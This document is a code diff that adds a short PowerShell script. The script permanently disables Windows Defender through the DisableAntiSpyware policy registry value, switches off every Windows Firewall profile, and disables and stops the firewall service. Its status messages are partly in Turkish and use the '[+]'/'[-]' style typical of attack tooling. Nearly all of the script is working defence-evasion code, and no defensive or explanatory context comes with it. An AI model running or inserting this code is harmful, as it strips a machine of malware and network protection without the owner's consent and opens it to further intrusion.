@@ -1,0 +1,21 @@
+try {
+    if (-not (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender")) {
+        New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
+    }
+    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" `
+                     -Name "DisableAntiSpyware" `
+                     -Value 1 `
+                     -PropertyType DWORD `
+                     -Force | Out-Null
+    Write-Host "[+] Windows Defender başarıyla devre dışı bırakıldı (kalıcı)."
+} catch {
+    Write-Host "[-] Windows Defender devre dışı bırakılamadı: $_"
+}
+
+try {
+    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+    Set-Service -Name 'mpssvc' -StartupType Disabled
+    Stop-Service -Name 'mpssvc' -Force
+} catch {
+    Write-Host "Firewall disable attempt failed: $($_.Exception.Message)"
+}
